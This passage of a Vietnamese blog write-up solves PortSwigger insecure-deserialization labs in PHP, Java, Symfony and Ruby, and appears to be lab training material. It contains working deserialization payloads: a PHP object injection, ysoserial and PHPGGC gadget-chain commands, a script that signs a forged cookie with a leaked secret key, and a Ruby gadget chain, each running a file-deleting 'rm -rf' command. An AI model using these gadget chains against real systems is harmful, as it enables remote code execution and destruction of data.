+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">saveTemplate</span>($template) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">isTemplateLocked</span>()) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">file_put_contents</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">lock_file_path</span>, <span style="color:#e6db74">&#34;&#34;</span>) <span style="color:#f92672">===</span> <span style="color:#66d9ef">false</span>) {
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Exception</span>(<span style="color:#e6db74">&#34;Could not write to &#34;</span> <span style="color:#f92672">.</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">lock_file_path</span>);
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">file_put_contents</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">template_file_path</span>, $template) <span style="color:#f92672">===</span> <span style="color:#66d9ef">false</span>) {
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Exception</span>(<span style="color:#e6db74">&#34;Could not write to &#34;</span> <span style="color:#f92672">.</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">template_file_path</span>);                    
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> __destruct() {
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Carlos thought this would be a good idea
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">file_exists</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">lock_file_path</span>)) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">unlink</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">lock_file_path</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><p>Một class <code>CustomTemplate</code> được định nghĩa với 2 thuộc tính <code>template_file_path</code> và <code>lock_file_path</code>. Ta chỉ cần quan tâm <a href="https://www.php.net/manual/en/language.oop5.magic.php" target="_blank" rel="noopener noreffer">magic method</a>
+ <code>__destruct()</code> khi nó thực hiện xóa file tại <code>lock_file_path</code>, nếu nó tồn tại. Mặt khác <code>__destruct()</code> sẽ được gọi khi server thực hiện deserialize.</p>
+<p>=&gt; Ta có thể tận dụng session cookie để thực hiện Object Injection như sau:</p>
+<pre tabindex="0"><code>O: 14: &#34;CustomTemplate&#34;: 1: {s: 14: &#34;lock_file_path&#34;; s: 23: &#34;/home/carlos/morale.txt&#34;;}
+</code></pre><p>Endcode base64 và edit cookie:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://github.com/g03m0n/pics/assets/130943529/7040aead-3257-47fa-af8b-e2a11028485d"
+        data-srcset="https://github.com/g03m0n/pics/assets/130943529/7040aead-3257-47fa-af8b-e2a11028485d, https://github.com/g03m0n/pics/assets/130943529/7040aead-3257-47fa-af8b-e2a11028485d 1.5x, https://github.com/g03m0n/pics/assets/130943529/7040aead-3257-47fa-af8b-e2a11028485d 2x"
+        data-sizes="auto"
+        alt="https://github.com/g03m0n/pics/assets/130943529/7040aead-3257-47fa-af8b-e2a11028485d"
+        title="image" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://github.com/g03m0n/pics/assets/130943529/8a24c0ce-2379-4cc6-b205-93adb3111cc8"
+        data-srcset="https://github.com/g03m0n/pics/assets/130943529/8a24c0ce-2379-4cc6-b205-93adb3111cc8, https://github.com/g03m0n/pics/assets/130943529/8a24c0ce-2379-4cc6-b205-93adb3111cc8 1.5x, https://github.com/g03m0n/pics/assets/130943529/8a24c0ce-2379-4cc6-b205-93adb3111cc8 2x"
+        data-sizes="auto"
+        alt="https://github.com/g03m0n/pics/assets/130943529/8a24c0ce-2379-4cc6-b205-93adb3111cc8"
+        title="image" /></p>
+<p>Solved</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://github.com/g03m0n/pics/assets/130943529/3c35aba8-0c6c-48ce-9c34-cebdf83f5463"
+        data-srcset="https://github.com/g03m0n/pics/assets/130943529/3c35aba8-0c6c-48ce-9c34-cebdf83f5463, https://github.com/g03m0n/pics/assets/130943529/3c35aba8-0c6c-48ce-9c34-cebdf83f5463 1.5x, https://github.com/g03m0n/pics/assets/130943529/3c35aba8-0c6c-48ce-9c34-cebdf83f5463 2x"
+        data-sizes="auto"
+        alt="https://github.com/g03m0n/pics/assets/130943529/3c35aba8-0c6c-48ce-9c34-cebdf83f5463"
+        title="image" /></p>
+<h2 id="5-exploiting-java-deserialization-with-apache-commons">5. Exploiting Java deserialization with Apache Commons</h2>
+<h3 id="description-4">Description</h3>
+<blockquote>
+<p>This lab uses a serialization-based session mechanism and loads the Apache Commons Collections library. Although you don&rsquo;t have source code access, you can still exploit this lab using pre-built gadget chains.
+To solve the lab, use a third-party tool to generate a malicious serialized object containing a remote code execution payload. Then, pass this object into the website to delete the morale.txt file from Carlos&rsquo;s home directory.
+You can log in to your own account using the following credentials: wiener:peter</p>
+</blockquote>
+<h3 id="exploitation">Exploitation</h3>
+<p>Cookie của ứng dụng là một Java serialize Object</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://hackmd.io/_uploads/r1Qycj7kR.png"
+        data-srcset="https://hackmd.io/_uploads/r1Qycj7kR.png, https://hackmd.io/_uploads/r1Qycj7kR.png 1.5x, https://hackmd.io/_uploads/r1Qycj7kR.png 2x"
+        data-sizes="auto"
+        alt="https://hackmd.io/_uploads/r1Qycj7kR.png"
+        title="image" /></p>
+<p>Ở lab này, ta sẽ tạo <code>gadget chain</code> bằng ứng dụng có tên là <a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener noreffer">ysoserial</a>
+ để khai thác.</p>
+<p>Đầu tiên, vì ứng dụng sử dụng thư viện <code>Apache Commons Collections</code> nên ta sẽ sử dụng <code>gadget chain</code> có tên là <code>CommonsCollections1</code>,&hellip;, <code>CommonsCollections4</code> để sinh ra payload. Sau vài lần thử, ta có thể dụng được gadget<code>CommonsCollections4</code>.</p>
+<p>Payload:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>java <span style="color:#960050;background-color:#1e0010">\</span>
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">--</span>add<span style="color:#f92672">-</span>opens<span style="color:#f92672">=</span>java.<span style="color:#a6e22e">xml</span><span style="color:#f92672">/</span>com.<span style="color:#a6e22e">sun</span>.<span style="color:#a6e22e">org</span>.<span style="color:#a6e22e">apache</span>.<span style="color:#a6e22e">xalan</span>.<span style="color:#a6e22e">internal</span>.<span style="color:#a6e22e">xsltc</span>.<span style="color:#a6e22e">trax</span><span style="color:#f92672">=</span>ALL<span style="color:#f92672">-</span>UNNAMED<span style="color:#960050;background-color:#1e0010">\</span>
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">--</span>add<span style="color:#f92672">-</span>opens<span style="color:#f92672">=</span>java.<span style="color:#a6e22e">xml</span><span style="color:#f92672">/</span>com.<span style="color:#a6e22e">sun</span>.<span style="color:#a6e22e">org</span>.<span style="color:#a6e22e">apache</span>.<span style="color:#a6e22e">xalan</span>.<span style="color:#a6e22e">internal</span>.<span style="color:#a6e22e">xsltc</span>.<span style="color:#a6e22e">runtime</span><span style="color:#f92672">=</span>ALL<span style="color:#f92672">-</span>UNNAMED<span style="color:#960050;background-color:#1e0010">\</span>
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">--</span>add<span style="color:#f92672">-</span>opens<span style="color:#f92672">=</span>java.<span style="color:#a6e22e">base</span><span style="color:#f92672">/</span>sun.<span style="color:#a6e22e">reflect</span>.<span style="color:#a6e22e">annotation</span><span style="color:#f92672">=</span>ALL<span style="color:#f92672">-</span>UNNAMED<span style="color:#960050;background-color:#1e0010">\</span>
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">-</span>jar .<span style="color:#f92672">/</span>ysoserial<span style="color:#f92672">-</span>all.<span style="color:#a6e22e">jar</span> CommonsCollections4 <span style="color:#e6db74">&#34;rm -rf /home/carlos/morale.txt&#34;</span> 2<span style="color:#f92672">&gt;</span> nul <span style="color:#f92672">|</span> base64 <span style="color:#f92672">-</span>w0 
+</span></span></code></pre></div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://hackmd.io/_uploads/HyBnRs7JA.png"
+        data-srcset="https://hackmd.io/_uploads/HyBnRs7JA.png, https://hackmd.io/_uploads/HyBnRs7JA.png 1.5x, https://hackmd.io/_uploads/HyBnRs7JA.png 2x"
+        data-sizes="auto"
+        alt="https://hackmd.io/_uploads/HyBnRs7JA.png"
+        title="image" /></p>
+<p>Sử dụng payload vừa tạo và send request</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://hackmd.io/_uploads/rkHAenQ1C.png"
+        data-srcset="https://hackmd.io/_uploads/rkHAenQ1C.png, https://hackmd.io/_uploads/rkHAenQ1C.png 1.5x, https://hackmd.io/_uploads/rkHAenQ1C.png 2x"
+        data-sizes="auto"
+        alt="https://hackmd.io/_uploads/rkHAenQ1C.png"
+        title="image" /></p>
+<p>Ứng dụng có mã lỗi 500 nhưng ta vẫn solve được challange.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://hackmd.io/_uploads/r1lbbnmyR.png"
+        data-srcset="https://hackmd.io/_uploads/r1lbbnmyR.png, https://hackmd.io/_uploads/r1lbbnmyR.png 1.5x, https://hackmd.io/_uploads/r1lbbnmyR.png 2x"
+        data-sizes="auto"
+        alt="https://hackmd.io/_uploads/r1lbbnmyR.png"
+        title="image" /></p>
+<h2 id="6-exploiting-php-deserialization-with-a-pre-built-gadget-chain">6. Exploiting PHP deserialization with a pre-built gadget chain</h2>
+<h3 id="description-5">Description</h3>
+<blockquote>
+<p>This lab has a serialization-based session mechanism that uses a signed cookie. It also uses a common PHP framework. Although you don&rsquo;t have source code access, you can still exploit this lab&rsquo;s insecure deserialization using pre-built gadget chains.
+To solve the lab, identify the target framework then use a third-party tool to generate a malicious serialized object containing a remote code execution payload. Then, work out how to generate a valid signed cookie containing your malicious object. Finally, pass this into the website to delete the morale.txt file from Carlos&rsquo;s home directory.
+You can log in to your own account using the following credentials: <code>wiener:peter</code></p>
+</blockquote>
+<h3 id="exploitation-1">Exploitation</h3>
+<p>Bài này tương tự bài trên nhưng sử dụng ngôn ngữ PHP. Tool ta sẽ sử dụng cho bài này có tên là <a href="https://github.com/ambionics/phpggc" target="_blank" rel="noopener noreffer">PHPGCC</a>
+</p>
+<p>Cookie là một <code>PHP serialize Object</code>. Trong đó, trường <code>sig_hmac_sha1</code> chính là <code>signature</code> để verify User object tại trường <code>token</code> có bị thay đổi hay không.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://hackmd.io/_uploads/SkEcdhmk0.png"
+        data-srcset="https://hackmd.io/_uploads/SkEcdhmk0.png, https://hackmd.io/_uploads/SkEcdhmk0.png 1.5x, https://hackmd.io/_uploads/SkEcdhmk0.png 2x"
+        data-sizes="auto"
+        alt="https://hackmd.io/_uploads/SkEcdhmk0.png"
+        title="image" /></p>
+<p>Khi ta nhập session sai và gửi request, server trả về thông báo lỗi <code>signature</code> sai và thư viện sử dụng:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://hackmd.io/_uploads/BkUCF3QkA.png"
+        data-srcset="https://hackmd.io/_uploads/BkUCF3QkA.png, https://hackmd.io/_uploads/BkUCF3QkA.png 1.5x, https://hackmd.io/_uploads/BkUCF3QkA.png 2x"
+        data-sizes="auto"
+        alt="https://hackmd.io/_uploads/BkUCF3QkA.png"
+        title="image" /></p>
+<p>Ở đây ứng dụng sử dụng thư viện <code>Symphony</code> version <code>4.3.6</code>
+Tiến hành tạo payload bằng <code>PHPGGC</code> tool.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://hackmd.io/_uploads/SyvOqnQ1C.png"
+        data-srcset="https://hackmd.io/_uploads/SyvOqnQ1C.png, https://hackmd.io/_uploads/SyvOqnQ1C.png 1.5x, https://hackmd.io/_uploads/SyvOqnQ1C.png 2x"
+        data-sizes="auto"
+        alt="https://hackmd.io/_uploads/SyvOqnQ1C.png"
+        title="image" /></p>
+<p>Payload:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">php</span> <span style="color:#f92672">./</span><span style="color:#a6e22e">phpggc</span> <span style="color:#a6e22e">Symfony</span><span style="color:#f92672">/</span><span style="color:#a6e22e">RCE4</span> <span style="color:#a6e22e">system</span> <span style="color:#e6db74">&#39;rm -rf /home/carlos/morale.txt&#39;</span> <span style="color:#ae81ff">2</span><span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">null</span> <span style="color:#f92672">|</span> <span style="color:#a6e22e">base64</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">w0</span> <span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">cookie</span><span style="color:#f92672">.</span><span style="color:#a6e22e">txt</span>
+</span></span></code></pre></div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://hackmd.io/_uploads/B1xWjnXJC.png"
+        data-srcset="https://hackmd.io/_uploads/B1xWjnXJC.png, https://hackmd.io/_uploads/B1xWjnXJC.png 1.5x, https://hackmd.io/_uploads/B1xWjnXJC.png 2x"
+        data-sizes="auto"
+        alt="https://hackmd.io/_uploads/B1xWjnXJC.png"
+        title="image" /></p>
+<p>Vì server sử dụng <code>signature key</code> để verify user nên ta cần <code>SECRET_KEY</code> để hoàn thành payload.</p>
+<p>Đọc <code>source</code> html của ứng dụng có một đường dẫn <code>debug</code>:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://hackmd.io/_uploads/Skq_s2Qk0.png"
+        data-srcset="https://hackmd.io/_uploads/Skq_s2Qk0.png, https://hackmd.io/_uploads/Skq_s2Qk0.png 1.5x, https://hackmd.io/_uploads/Skq_s2Qk0.png 2x"
+        data-sizes="auto"
+        alt="https://hackmd.io/_uploads/Skq_s2Qk0.png"
+        title="image" /></p>
+<p>Truy cập đường dẫn ta tìm được <code>SECRET_KEY</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://hackmd.io/_uploads/r14e3hQ1R.png"
+        data-srcset="https://hackmd.io/_uploads/r14e3hQ1R.png, https://hackmd.io/_uploads/r14e3hQ1R.png 1.5x, https://hackmd.io/_uploads/r14e3hQ1R.png 2x"
+        data-sizes="auto"
+        alt="https://hackmd.io/_uploads/r14e3hQ1R.png"
+        title="image" /></p>
+<p>Sử dụng script này để sign  <code>SECRET_KEY</code> với <code>payload generated</code>:</p>
+<pre tabindex="0"><code>&lt;?php
+$payload = &#34;Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czozMDoicm0gLXJmIC9ob21lL2Nhcmxvcy9tb3JhbGUudHh0Ijt9fXM6NTM6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBwb29sIjtPOjQ0OiJTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFByb3h5QWRhcHRlciI6Mjp7czo1NDoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyAHBvb2xIYXNoIjtpOjE7czo1ODoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyAHNldElubmVySXRlbSI7czo2OiJzeXN0ZW0iO319Cg==&#34;;
+$secret = &#34;hwo9dc4j2ef2vmehy8o01n6m6owbbz6b&#34;;
+$sig_hmac_sha1 = hash_hmac(&#34;sha1&#34;, $payload, $secret);
+
+$cookie = urlencode(&#39;{&#34;token&#34;:&#34;&#39;.$payload.&#39;&#34;,&#34;sig_hmac_sha1&#34;:&#34;&#39;.$sig_hmac_sha1.&#39;&#34;}&#39;);
+print_r($cookie);
+?&gt;
+</code></pre><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://hackmd.io/_uploads/B1cn2h7y0.png"
+        data-srcset="https://hackmd.io/_uploads/B1cn2h7y0.png, https://hackmd.io/_uploads/B1cn2h7y0.png 1.5x, https://hackmd.io/_uploads/B1cn2h7y0.png 2x"
+        data-sizes="auto"
+        alt="https://hackmd.io/_uploads/B1cn2h7y0.png"
+        title="image" /></p>
+<p>Ứng dụng thông báo lỗi nhưng ta vẫn solve được challenge.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://hackmd.io/_uploads/rkilThmkA.png"
+        data-srcset="https://hackmd.io/_uploads/rkilThmkA.png, https://hackmd.io/_uploads/rkilThmkA.png 1.5x, https://hackmd.io/_uploads/rkilThmkA.png 2x"
+        data-sizes="auto"
+        alt="https://hackmd.io/_uploads/rkilThmkA.png"
+        title="image" /></p>
+<p>Solved</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://hackmd.io/_uploads/HkO0n2XyR.png"
+        data-srcset="https://hackmd.io/_uploads/HkO0n2XyR.png, https://hackmd.io/_uploads/HkO0n2XyR.png 1.5x, https://hackmd.io/_uploads/HkO0n2XyR.png 2x"
+        data-sizes="auto"
+        alt="https://hackmd.io/_uploads/HkO0n2XyR.png"
+        title="image" /></p>
+<h2 id="7-exploiting-ruby-deserialization-using-a-documented-gadget-chain">7. Exploiting Ruby deserialization using a documented gadget chain</h2>
+<h3 id="description-6">Description</h3>
+<blockquote>
+<p>This lab uses a serialization-based session mechanism and the Ruby on Rails framework. There are documented exploits that enable remote code execution via a gadget chain in this framework.
+To solve the lab, find a documented exploit and adapt it to create a malicious serialized object containing a remote code execution payload. Then, pass this object into the website to delete the morale.txt file from Carlos&rsquo;s home directory.
+You can log in to your own account using the following credentials: wiener:peter</p>
+</blockquote>
+<h3 id="exploitation-2">Exploitation</h3>
+<p>Session cookie là một <code>Ruby deserialize Object</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://hackmd.io/_uploads/H17GrT7kC.png"
+        data-srcset="https://hackmd.io/_uploads/H17GrT7kC.png, https://hackmd.io/_uploads/H17GrT7kC.png 1.5x, https://hackmd.io/_uploads/H17GrT7kC.png 2x"
+        data-sizes="auto"
+        alt="https://hackmd.io/_uploads/H17GrT7kC.png"
+        title="image" /></p>
+<p>Ở lab này, ta sẽ sử dụng script của một blog viết về <a href="https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html" target="_blank" rel="noopener noreffer">Universal Deserialisation Gadget for Ruby 2.x-3.x</a>
+.</p>
+<p>Script có nội dung như sau:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span><span style="color:#75715e"># Autoload the required classes</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">Gem</span><span style="color:#f92672">::</span><span style="color:#66d9ef">SpecFetcher</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">Gem</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Installer</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># prevent the payload from running when we Marshal.dump it</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">module</span> Gem
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Requirement</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">marshal_dump</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">[</span>@requirements<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">end</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">end</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>wa1 <span style="color:#f92672">=</span> <span style="color:#66d9ef">Net</span><span style="color:#f92672">::</span><span style="color:#66d9ef">WriteAdapter</span><span style="color:#f92672">.</span>new(<span style="color:#66d9ef">Kernel</span>, <span style="color:#e6db74">:system</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>rs <span style="color:#f92672">=</span> <span style="color:#66d9ef">Gem</span><span style="color:#f92672">::</span><span style="color:#66d9ef">RequestSet</span><span style="color:#f92672">.</span>allocate
+</span></span><span style="display:flex;"><span>rs<span style="color:#f92672">.</span>instance_variable_set(<span style="color:#e6db74">&#39;@sets&#39;</span>, wa1)
+</span></span><span style="display:flex;"><span>rs<span style="color:#f92672">.</span>instance_variable_set(<span style="color:#e6db74">&#39;@git_set&#39;</span>, <span style="color:#e6db74">&#34;rm -rf /home/carlos/morale.txt&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>wa2 <span style="color:#f92672">=</span> <span style="color:#66d9ef">Net</span><span style="color:#f92672">::</span><span style="color:#66d9ef">WriteAdapter</span><span style="color:#f92672">.</span>new(rs, <span style="color:#e6db74">:resolve</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>i <span style="color:#f92672">=</span> <span style="color:#66d9ef">Gem</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Package</span><span style="color:#f92672">::</span><span style="color:#66d9ef">TarReader</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Entry</span><span style="color:#f92672">.</span>allocate
+</span></span><span style="display:flex;"><span>i<span style="color:#f92672">.</span>instance_variable_set(<span style="color:#e6db74">&#39;@read&#39;</span>, <span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>i<span style="color:#f92672">.</span>instance_variable_set(<span style="color:#e6db74">&#39;@header&#39;</span>, <span style="color:#e6db74">&#34;aaa&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>n <span style="color:#f92672">=</span> <span style="color:#66d9ef">Net</span><span style="color:#f92672">::</span><span style="color:#66d9ef">BufferedIO</span><span style="color:#f92672">.</span>allocate
+</span></span><span style="display:flex;"><span>n<span style="color:#f92672">.</span>instance_variable_set(<span style="color:#e6db74">&#39;@io&#39;</span>, i)
+</span></span><span style="display:flex;"><span>n<span style="color:#f92672">.</span>instance_variable_set(<span style="color:#e6db74">&#39;@debug_output&#39;</span>, wa2)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>t <span style="color:#f92672">=</span> <span style="color:#66d9ef">Gem</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Package</span><span style="color:#f92672">::</span><span style="color:#66d9ef">TarReader</span><span style="color:#f92672">.</span>allocate
+</span></span><span style="display:flex;"><span>t<span style="color:#f92672">.</span>instance_variable_set(<span style="color:#e6db74">&#39;@io&#39;</span>, n)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> <span style="color:#66d9ef">Gem</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Requirement</span><span style="color:#f92672">.</span>allocate
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>instance_variable_set(<span style="color:#e6db74">&#39;@requirements&#39;</span>, t)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#66d9ef">Marshal</span><span style="color:#f92672">.</span>dump(<span style="color:#f92672">[</span><span style="color:#66d9ef">Gem</span><span style="color:#f92672">::</span><span style="color:#66d9ef">SpecFetcher</span>, <span style="color:#66d9ef">Gem</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Installer</span>, r<span style="color:#f92672">]</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>require <span style="color:#e6db74">&#34;base64&#34;</span>
+</span></span><span style="display:flex;"><span>puts <span style="color:#66d9ef">Base64</span><span style="color:#f92672">.</span>encode64(payload)
+</span></span></code></pre></div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://hackmd.io/_uploads/H1rQDaQyA.png"
+        data-srcset="https://hackmd.io/_uploads/H1rQDaQyA.png, https://hackmd.io/_uploads/H1rQDaQyA.png 1.5x, https://hackmd.io/_uploads/H1rQDaQyA.png 2x"
+        data-sizes="auto"
+        alt="https://hackmd.io/_uploads/H1rQDaQyA.png"
+        title="image" /></p>
+<p>Thay cookie và gửi request</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://hackmd.io/_uploads/rkBOwTmk0.png"
+        data-srcset="https://hackmd.io/_uploads/rkBOwTmk0.png, https://hackmd.io/_uploads/rkBOwTmk0.png 1.5x, https://hackmd.io/_uploads/rkBOwTmk0.png 2x"
+        data-sizes="auto"
+        alt="https://hackmd.io/_uploads/rkBOwTmk0.png"
+        title="image" /></p>
+<p>Ứng dụng thông báo lỗi nhưng ta vẫn solve được challenge.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://hackmd.io/_uploads/rJV9DTXJR.png"
+        data-srcset="https://hackmd.io/_uploads/rJV9DTXJR.png, https://hackmd.io/_uploads/rJV9DTXJR.png 1.5x, https://hackmd.io/_uploads/rJV9DTXJR.png 2x"
+        data-sizes="auto"
+        alt="https://hackmd.io/_uploads/rJV9DTXJR.png"
+        title="image" /></p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2023-12-20</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://g03m0n.github.io/posts/portswigger-insecure-deserialization/" data-title="PortSwigger - Insecure Deserialization" data-hashtags="ctf,lab"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://g03m0n.github.io/posts/portswigger-insecure-deserialization/" data-hashtag="ctf"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://g03m0n.github.io/posts/portswigger-insecure-deserialization/" data-title="PortSwigger - Insecure Deserialization"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/ctf/">Ctf</a>,&nbsp;<a href="/tags/lab/">Lab</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/cve-2022-33891/" class="prev" rel="prev" title="CVE-2022-33891"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>CVE-2022-33891</a>
+            <a href="/posts/cookiectf-baby-sqlite-with-filter/" class="next" rel="next" title="CookieCTF - Baby SQLite With Filter">CookieCTF - Baby SQLite With Filter<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+<div id="comments"><div id="fb-root" class="comment"></div>
+            <div
+                class="fb-comments"
+                data-href="https://g03m0n.github.io/posts/portswigger-insecure-deserialization/"
+                data-width="100%"
+                data-numposts="10"
+            ></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://developers.facebook.com/docs/plugins/comments/"></a>Facebook</a>.
+            </noscript><div id="utterances" class="comment"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://utteranc.es/">Utterances</a>.
+            </noscript></div></article></div>
+            </main><footer class="footer">
